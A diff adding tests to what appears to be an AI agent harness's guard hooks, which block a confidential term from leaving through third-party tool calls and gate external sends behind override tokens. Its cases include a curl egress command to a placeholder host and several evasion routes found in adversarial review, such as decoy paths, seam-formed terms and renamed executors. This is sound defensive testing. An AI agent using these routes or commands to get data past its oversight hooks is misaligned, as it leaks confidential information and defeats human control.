@@ -675,6 +675,277 @@ def test_override_mint_wired():
           disp.BASH_GUARD_CHAIN[-1] == "pipe-mask-guard")
 
 
+# ------------------------------------------------------------------ R  RESIDUAL egress (#452 follow-up)
+# Every tool #452's snapshot test listed as RESIDUAL is now routed and classified (or moved to a
+# concrete exclusion). Names are the live harness forms (uuid connectors as captured in
+# mcp_tool_snapshot.json; local servers by their server name). Each class: a roster term in the
+# outbound text BLOCKS, clean text passes.
+DRIVE = "mcp__45584658-e0ff-4b66-972a-09a41d9941d2__"
+DESIGN = "mcp__7c55602a-d1ec-4c77-a92e-06ee3c786d3a__"
+COMPOSIO = "mcp__8a611864-5cda-497f-baf9-6d3c02ab3404__"
+RUBE = "mcp__d6315173-234c-4e6c-bea7-7f5e15d2bde5__"
+GMAIL_DRAFT = ("mcp__8ac87555-f8a7-4acc-82c5-cb75e6b92ee3__"
+               "gmail_create_draft-950737b91de8397144477ba94ad008e9")
+QBO = "mcp__52fa80c0-fe01-4bd6-b488-39531b108fe4__"
+MSDOCS = "mcp__5399b569-1d87-49ca-841c-ec4725b3f124__"
+HUBSPOT = "mcp__a3e380ce-2ea9-4b42-92d9-37c588a4b760__"
+APIFY = "mcp__Apify__"
+WIN = "mcp__Windows-MCP__"
+CU = "mcp__computer-use__"
+FS = "mcp__Filesystem__"
+MNEMO = "mcp__Mnemoverse_Memory__"
+SLUG = TERM.lower().replace(" ", "-")
+
+
+def _pair(name, tool, dirty, clean):
+    expect(name + " (term)", CONF, tool, dirty, 2)
+    expect(name + " (clean)", CONF, tool, clean, 0)
+
+
+def test_residual_conf():
+    _pair("R1 Drive create_file content", DRIVE + "create_file",
+          {"title": "memo", "content": "re: " + TERM}, {"title": "memo", "content": "market note"})
+    _pair("R1b Drive create_file title", DRIVE + "create_file",
+          {"title": TERM, "content": "x"}, {"title": "market", "content": "x"})
+    _pair("R2 Firefly board name", DESIGN + "create_firefly_board",
+          {"name": TERM}, {"name": "moodboard"})
+    _pair("R3 design fill_text", DESIGN + "fill_text", {"text": TERM}, {"text": "For Lease"})
+    up = _tmpfile("r-upload.txt", "notes on " + TERM)
+    ok = _tmpfile("r-upload-ok.txt", "plain notes")
+    _pair("R3b design asset_add_file reads the local file", DESIGN + "asset_add_file",
+          {"filePath": up}, {"filePath": ok})
+    _pair("R3c design asset_initialize_file_upload name", DESIGN + "asset_initialize_file_upload",
+          {"fileName": TERM + ".png"}, {"fileName": "site.png"})
+    _pair("R3d design asset_finalize_file_upload", DESIGN + "asset_finalize_file_upload",
+          {"uploadId": "u1", "title": TERM}, {"uploadId": "u1"})
+    _pair("R3e document_merge_data_layout data", DESIGN + "document_merge_data_layout",
+          {"data": {"title": TERM}}, {"data": {"title": "Flyer"}})
+    _pair("R3f document_merge_data_vector data", DESIGN + "document_merge_data_vector",
+          {"data": [TERM]}, {"data": ["Flyer"]})
+    for pre, brand in ((COMPOSIO, "COMPOSIO"), (RUBE, "RUBE")):
+        _pair("R4 %s_MULTI_EXECUTE_TOOL arguments" % brand, pre + brand + "_MULTI_EXECUTE_TOOL",
+              {"tools": [{"tool_slug": "GMAIL_SEND_EMAIL", "arguments": {"body": TERM}}]},
+              {"tools": [{"tool_slug": "GMAIL_SEND_EMAIL", "arguments": {"body": "hello"}}]})
+        _pair("R4b %s_REMOTE_BASH_TOOL any command" % brand, pre + brand + "_REMOTE_BASH_TOOL",
+              {"command": "echo " + TERM + " > notes.txt"}, {"command": "ls -la"})
+        _pair("R4c %s_REMOTE_WORKBENCH code" % brand, pre + brand + "_REMOTE_WORKBENCH",
+              {"code_to_execute": "x = '%s'" % TERM}, {"code_to_execute": "x = 1"})
+    _pair("R4d RUBE_EXECUTE_RECIPE input", RUBE + "RUBE_EXECUTE_RECIPE",
+          {"recipe_id": "r1", "input_data": {"subject": TERM}}, {"recipe_id": "r1"})
+    _pair("R4e RUBE_CREATE_UPDATE_RECIPE body", RUBE + "RUBE_CREATE_UPDATE_RECIPE",
+          {"name": TERM}, {"name": "weekly digest"})
+    _pair("R5 Gmail draft body", GMAIL_DRAFT, {"to": "a@example.com", "body": TERM},
+          {"to": "a@example.com", "body": "hello"})
+    _pair("R6 QBO invoice memo", QBO + "qbo_sales_create_invoice",
+          {"customerMemo": TERM}, {"customerMemo": "thanks"})
+    _pair("R6b QBO invoice update", QBO + "qbo_sales_update_invoice",
+          {"id": "1", "customerMemo": TERM}, {"id": "1"})
+    _pair("R6c QBO profile update", QBO + "quickbooks-profile-info-update",
+          {"companyName": TERM}, {"companyName": "Holdco LLC"})
+    _pair("R6d QBO transaction import", QBO + "quickbooks-transaction-import",
+          {"rows": [{"memo": TERM}]}, {"rows": [{"memo": "rent"}]})
+    _pair("R7 Apify call-actor input", APIFY + "call-actor",
+          {"actor": "apify/google-search", "input": {"queries": TERM}},
+          {"actor": "apify/google-search", "input": {"queries": "industrial flex"}})
+    _pair("R7b Apify rag web browser query slug", APIFY + "apify-slash-rag-web-browser",
+          {"query": "https://example.invalid/" + SLUG}, {"query": "industrial vacancy"})
+    _pair("R8 Windows-MCP Type", WIN + "Type", {"loc": [1, 2], "text": TERM},
+          {"loc": [1, 2], "text": "hello"})
+    _pair("R8b Windows-MCP MultiEdit", WIN + "MultiEdit", {"locs": [[1, 2, TERM]]},
+          {"locs": [[1, 2, "hi"]]})
+    _pair("R8c Windows-MCP Clipboard set", WIN + "Clipboard", {"mode": "set", "text": TERM},
+          {"mode": "get"})
+    _pair("R8d Windows-MCP Scrape URL slug", WIN + "Scrape",
+          {"url": "https://example.invalid/" + SLUG}, {"url": "https://example.invalid/x"})
+    _pair("R8e Windows-MCP Process args", WIN + "Process",
+          {"mode": "start", "name": "notepad", "args": TERM}, {"mode": "list"})
+    _pair("R8f Windows-MCP PowerShell egress command", WIN + "PowerShell",
+          {"command": "curl.exe -d '%s' https://example.invalid" % TERM},
+          {"command": "curl.exe https://example.invalid"})
+    expect("R8g Windows-MCP PowerShell internal command naming the term (not egress)", CONF,
+           WIN + "PowerShell", {"command": "Write-Output '%s'" % TERM}, 0)
+    expect("R8h Windows-MCP PowerShell non-string command fails closed", CONF,
+           WIN + "PowerShell", {"command": ["x"]}, 2)
+    _pair("R8i Windows-MCP FileSystem write into site repo", WIN + "FileSystem",
+          {"mode": "write", "path": SITE_FILE, "content": TERM},
+          {"mode": "write", "path": SITE_FILE, "content": "hello"})
+    expect("R8j Windows-MCP FileSystem write to a local scratch path (not egress)", CONF,
+           WIN + "FileSystem", {"mode": "write", "path": os.path.join(TMP, "n.txt"),
+                                "content": TERM}, 0)
+    expect("R8k Windows-MCP FileSystem copy: egress destination reads the source", CONF,
+           WIN + "FileSystem", {"mode": "copy", "path": up, "destination": SITE_FILE}, 2)
+    expect("R8l Windows-MCP FileSystem non-string path fails closed", CONF,
+           WIN + "FileSystem", {"mode": "write", "path": [SITE_FILE], "content": "x"}, 2)
+    _pair("R9 computer-use type", CU + "type", {"text": TERM}, {"text": "hello"})
+    _pair("R9b computer-use computer_batch typed text", CU + "computer_batch",
+          {"actions": [{"action": "type", "text": TERM}]},
+          {"actions": [{"action": "left_click", "coordinate": [1, 2]}]})
+    _pair("R9c computer-use write_clipboard", CU + "write_clipboard", {"text": TERM},
+          {"text": "hello"})
+    _pair("R9d computer-use teach_batch", CU + "teach_batch",
+          {"steps": [{"explanation": "x", "actions": [{"action": "type", "text": TERM}]}]},
+          {"steps": [{"explanation": "x", "actions": []}]})
+    os.makedirs(os.path.join(TMP, "outputs"), exist_ok=True)
+    r10 = os.path.join(TMP, "outputs", "r10.txt")
+    with open(r10, "w", encoding="utf-8") as f:
+        f.write("a")
+    _pair("R10 Filesystem edit_file into an egress path", FS + "edit_file",
+          {"path": r10, "edits": [{"oldText": "a", "newText": TERM}]},
+          {"path": r10, "edits": [{"oldText": "a", "newText": "b"}]})
+    expect("R10b Filesystem edit_file local scratch (not egress)", CONF, FS + "edit_file",
+           {"path": os.path.join(TMP, "e.txt"), "edits": [{"oldText": "a", "newText": TERM}]}, 0)
+    os.makedirs(os.path.join(TMP, "outputs"), exist_ok=True)
+    seam_out = os.path.join(TMP, "outputs", "seam.txt")
+    with open(seam_out, "w", encoding="utf-8") as f:
+        f.write("Zephyr Corp X")
+    expect("R10c Filesystem edit_file forms the term at a seam", CONF, FS + "edit_file",
+           {"path": seam_out, "edits": [{"oldText": "X", "newText": "Portfolio"}]}, 2)
+    expect("R10d Filesystem edit_file malformed edits fail closed", CONF, FS + "edit_file",
+           {"path": SITE_FILE, "edits": "nope"}, 2)
+    _pair("R11 Mnemoverse memory_write", MNEMO + "memory_write", {"content": TERM},
+          {"content": "note"})
+    _pair("R12 HubSpot submit_feedback", HUBSPOT + "submit_feedback", {"feedback": TERM},
+          {"feedback": "works"})
+    _pair("R12b DC give_feedback", DC + "give_feedback_to_desktop_commander",
+          {"feedback": TERM}, {"feedback": "ok"})
+    _pair("R12c Mnemoverse memory_feedback", MNEMO + "memory_feedback", {"comment": TERM},
+          {"comment": "ok"})
+    _pair("R13 Chrome shortcuts_execute", CHROME + "shortcuts_execute",
+          {"shortcut": "s1", "prompt": TERM}, {"shortcut": "s1"})
+    _pair("R14 Browser preview_start URL", BROWSER + "preview_start",
+          {"url": "https://example.invalid/" + SLUG}, {"name": "dev"})
+    _pair("R15 Microsoft docs search query", MSDOCS + "microsoft_docs_search",
+          {"query": TERM}, {"query": "graph api"})
+    _pair("R15b Microsoft docs fetch URL slug", MSDOCS + "microsoft_docs_fetch",
+          {"url": "https://learn.example.invalid/" + SLUG},
+          {"url": "https://learn.example.invalid/x"})
+    _pair("R15c Microsoft code sample search", MSDOCS + "microsoft_code_sample_search",
+          {"query": TERM.replace(" ", "+")}, {"query": "sharepoint"})
+    _pair("R15d Context7 query-docs", "mcp__context7__query-docs",
+          {"libraryId": "/x/y", "query": TERM}, {"libraryId": "/x/y", "query": "hooks"})
+    _pair("R15e Context7 query-docs (connector uuid form, slug)",
+          "mcp__85602316-38da-4653-9609-d1b4a9d9c454__query-docs",
+          {"libraryId": "/x/y", "query": SLUG}, {"libraryId": "/x/y", "query": "hooks"})
+    _pair("R15f punctuated term folded in a third-party query",
+          "mcp__context7__query-docs", {"query": "ovarrow yards"}, {"query": "yards"})
+    expect("R16 third-party tool_input not an object fails closed", CONF, DRIVE + "create_file",
+           "x", 2)
+
+
+def _token_run(tool, tool_input, recipients):
+    tokdir = os.path.join(TMP, "rx-sessions")
+    sess = "egress-rx-" + uuid.uuid4().hex[:8]
+    od = os.path.join(tokdir, sess, "overrides")
+    os.makedirs(od)
+    with open(os.path.join(od, "allow-external-send"), "w") as f:
+        f.write("scope: external-send\nsession: %s\nreason: test\nrecipients: %s\n"
+                % (sess, recipients))
+    payload = {"tool_name": tool, "tool_input": tool_input, "cwd": TMP, "session_id": sess}
+    env = dict(os.environ, ORA_OVERRIDE_SESSIONS_DIR=tokdir)
+    p = subprocess.run([sys.executable, AUTO], input=json.dumps(payload).encode("utf-8"),
+                       capture_output=True, env=env, timeout=120)
+    return p.returncode, p.stderr.decode("utf-8", "replace")
+
+
+def test_residual_autonomy():
+    deploy = "netlify deploy --prod --dir=dist"
+    for short in ("COMPOSIO_MULTI_EXECUTE_TOOL", "COMPOSIO_REMOTE_BASH_TOOL",
+                  "COMPOSIO_REMOTE_WORKBENCH"):
+        expect("RA1 %s needs an external-send token" % short, AUTO, COMPOSIO + short,
+               {"tools": []}, 2)
+    for short in ("RUBE_MULTI_EXECUTE_TOOL", "RUBE_EXECUTE_RECIPE", "RUBE_REMOTE_BASH_TOOL",
+                  "RUBE_REMOTE_WORKBENCH"):
+        expect("RA1 %s needs an external-send token" % short, AUTO, RUBE + short, {}, 2)
+    expect("RA2 RUBE_CREATE_UPDATE_RECIPE stores, does not send", AUTO,
+           RUBE + "RUBE_CREATE_UPDATE_RECIPE", {"name": "x"}, 0)
+    rc, err = _token_run(COMPOSIO + "COMPOSIO_MULTI_EXECUTE_TOOL", {"tools": []},
+                         "executor:COMPOSIO_MULTI_EXECUTE_TOOL")
+    check("RA3 token naming executor:<tool> -> allow", rc == 0, err)
+    rc, err = _token_run(RUBE + "RUBE_REMOTE_BASH_TOOL", {"command": "ls"},
+                         "executor:COMPOSIO_MULTI_EXECUTE_TOOL")
+    check("RA4 token naming a DIFFERENT executor -> still blocked", rc == 2, err)
+    expect("RA5 Windows-MCP PowerShell prod deploy", AUTO, WIN + "PowerShell",
+           {"command": deploy}, 2)
+    expect("RA6 Windows-MCP PowerShell read-only", AUTO, WIN + "PowerShell",
+           {"command": "Get-ChildItem"}, 0)
+    expect("RA7 Windows-MCP PowerShell non-string command fails closed", AUTO,
+           WIN + "PowerShell", {"command": 5}, 2)
+    expect("RA8 Windows-MCP FileSystem write into site repo", AUTO, WIN + "FileSystem",
+           {"mode": "write", "path": SITE_FILE, "content": "x"}, 2)
+    expect("RA9 Windows-MCP FileSystem move OUT of the site repo", AUTO, WIN + "FileSystem",
+           {"mode": "move", "path": SITE_FILE, "destination": os.path.join(TMP, "x")}, 2)
+    expect("RA10 Windows-MCP FileSystem local write", AUTO, WIN + "FileSystem",
+           {"mode": "write", "path": os.path.join(TMP, "x.txt"), "content": "x"}, 0)
+    expect("RA11 Filesystem edit_file into site repo", AUTO, FS + "edit_file",
+           {"path": SITE_FILE, "edits": [{"oldText": "a", "newText": "b"}]}, 2)
+    expect("RA12 Filesystem edit_file local", AUTO, FS + "edit_file",
+           {"path": os.path.join(TMP, "x.txt"), "edits": []}, 0)
+
+
+def test_residual_refute_round1():
+    """REFUTE round 1 (adversarial-reviewer, 2026-11-12) defects, pinned by behavior."""
+    os.makedirs(os.path.join(TMP, "outputs"), exist_ok=True)
+    for ext in (".pdf", ".docx", ".html", ".csv"):
+        src = _tmpfile("memo" + ext, "deck for " + TERM)
+        expect("RR1 FileSystem copy of an artifact-extension source (%s) into the site repo" % ext,
+               CONF, WIN + "FileSystem", {"mode": "copy", "path": src, "destination": SITE_FILE}, 2)
+    out_src = os.path.join(TMP, "outputs", "memo.txt")
+    with open(out_src, "w", encoding="utf-8") as f:
+        f.write(TERM)
+    expect("RR1b FileSystem move of an /outputs/ source into the site repo", CONF,
+           WIN + "FileSystem", {"mode": "move", "path": out_src, "destination": SITE_FILE}, 2)
+    expect("RR2 FileSystem copy whose source cannot be found fails closed", CONF,
+           WIN + "FileSystem", {"mode": "copy", "path": os.path.join(TMP, "missing.txt"),
+                                "destination": SITE_FILE}, 2)
+    expect("RR2b FileSystem relative path fails closed", CONF, WIN + "FileSystem",
+           {"mode": "write", "path": "site/x.html", "content": "x"}, 2)
+    seam_out = os.path.join(TMP, "outputs", "seam2.txt")
+    with open(seam_out, "w", encoding="utf-8") as f:
+        f.write("Zephyr Corp X")
+    expect("RR3 edit_file decoy file_path beside the real path fails closed", CONF, FS + "edit_file",
+           {"file_path": "C:/nowhere/dist/decoy.txt", "path": seam_out,
+            "edits": [{"oldText": "X", "newText": "Portfolio"}]}, 2)
+    expect("RR3b edit_file relative path fails closed", CONF, FS + "edit_file",
+           {"path": "outputs/seam2.txt", "edits": [{"oldText": "X", "newText": "Portfolio"}]}, 2)
+    expect("RR3c edit_file of a missing egress target fails closed", CONF, FS + "edit_file",
+           {"path": os.path.join(TMP, "outputs", "nope.txt"),
+            "edits": [{"oldText": "X", "newText": "y"}]}, 2)
+    expect("RR3d edit_file dryRun writes nothing", CONF, FS + "edit_file",
+           {"path": seam_out, "dryRun": True, "edits": [{"oldText": "X", "newText": "Portfolio"}]}, 0)
+    expect("RR3e edit_file non-bool dryRun is not a dry run", CONF, FS + "edit_file",
+           {"path": seam_out, "dryRun": "yes", "edits": [{"oldText": "X", "newText": "Portfolio"}]}, 2)
+    _pair("RR4 RUBE_MANAGE_RECIPE_SCHEDULE params", RUBE + "RUBE_MANAGE_RECIPE_SCHEDULE",
+          {"recipe_id": "r1", "params": {"subject": TERM}}, {"recipe_id": "r1"})
+    expect("RR4b RUBE_MANAGE_RECIPE_SCHEDULE needs an external-send token", AUTO,
+           RUBE + "RUBE_MANAGE_RECIPE_SCHEDULE", {"recipe_id": "r1"}, 2)
+    expect("RR5 executor payload with the term as a dict KEY", CONF,
+           COMPOSIO + "COMPOSIO_MULTI_EXECUTE_TOOL",
+           {"tools": [{"arguments": {"properties": {TERM: {"type": "title"}}}}]}, 2)
+    expect("RR6 future executor name variant is scanned", CONF,
+           COMPOSIO + "COMPOSIO_MULTI_EXECUTE_TOOL_V2", {"arguments": {"body": TERM}}, 2)
+    expect("RR6b future executor name variant is gated", AUTO,
+           COMPOSIO + "COMPOSIO_MULTI_EXECUTE_TOOL_V2", {}, 2)
+    expect("RR6c hash-suffixed executor name is scanned", CONF,
+           RUBE + "RUBE_REMOTE_BASH_TOOL-1a2b", {"command": "echo " + TERM}, 2)
+    expect("RR6d hash-suffixed executor name is gated", AUTO,
+           RUBE + "RUBE_REMOTE_BASH_TOOL-1a2b", {"command": "ls"}, 2)
+    clean_src = _tmpfile("clean-src.txt", "plain")
+    expect("RR7b FileSystem copy: unlisted source field beside a clean listed one", CONF,
+           WIN + "FileSystem", {"mode": "copy", "src": clean_src,
+                                "from": os.path.join(TMP, "memo.pdf"), "destination": SITE_FILE},
+           2)
+    home = os.path.expanduser("~")
+    tilde_src = os.path.join(TMP, "memo.pdf")
+    if os.path.normcase(tilde_src).startswith(os.path.normcase(home)):
+        expect("RR7c FileSystem copy: unlisted ~ source beside a clean listed one", CONF,
+               WIN + "FileSystem", {"mode": "copy", "src": clean_src,
+                                    "from": "~" + tilde_src[len(home):],
+                                    "destination": SITE_FILE}, 2)
+    expect("RR7 FileSystem copy with an unrecognised source field fails closed", CONF,
+           WIN + "FileSystem", {"mode": "copy", "from": os.path.join(TMP, "memo.pdf"),
+                                "destination": SITE_FILE}, 2)
+
+
 def main():
     try:
         test_conf_shell_tools()
@@ -692,6 +963,9 @@ def main():
         test_dispatcher_fail_closed()
         test_web_tools()
         test_block_message_redacted()
+        test_residual_conf()
+        test_residual_autonomy()
+        test_residual_refute_round1()
     finally:
         shutil.rmtree(TMP, ignore_errors=True)
     if FAILS:
